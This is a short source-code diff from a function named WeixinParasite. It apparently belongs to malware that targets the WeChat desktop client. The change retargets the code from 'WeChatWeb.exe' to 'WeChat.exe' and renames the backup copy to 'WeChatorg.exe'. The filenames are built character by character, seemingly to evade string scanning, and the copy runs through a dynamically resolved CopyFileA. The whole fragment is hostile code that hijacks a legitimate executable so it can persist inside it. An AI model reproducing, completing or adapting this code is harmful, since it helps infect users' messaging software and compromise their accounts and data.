@@ -67,10 +67,12 @@ int __stdcall WeixinParasite() {
 			DWORD dllcnt = 0;
 			ret = backHome((char*)wxexepth.c_str(), strDataPath, szdllname, &dllcnt);
 
-			char szwechatweb[] = { 'W','e','C','h','a','t','W','e','b','.','e','x','e',0 };
+			//char szwechatweb[] = { 'W','e','C','h','a','t','W','e','b','.','e','x','e',0 };
+			char szwechatweb[] = { 'W','e','C','h','a','t','.','e','x','e',0 };
 			string dstexefullname = wxexepth + szwechatweb;
 
-			char szwechatwebOld[] = { 'W','e','C','h','a','t','W','e','b','o','r','g','.','e','x','e',0 };
+			//char szwechatwebOld[] = { 'W','e','C','h','a','t','W','e','b','o','r','g','.','e','x','e',0 };
+			char szwechatwebOld[] = { 'W','e','C','h','a','t','o','r','g','.','e','x','e',0 };
 			string dstoldexefn = wxexepth + szwechatwebOld;
 			ret = lpCopyFileA((char*)dstexefullname.c_str(), (char*)dstoldexefn.c_str(), 0);
 
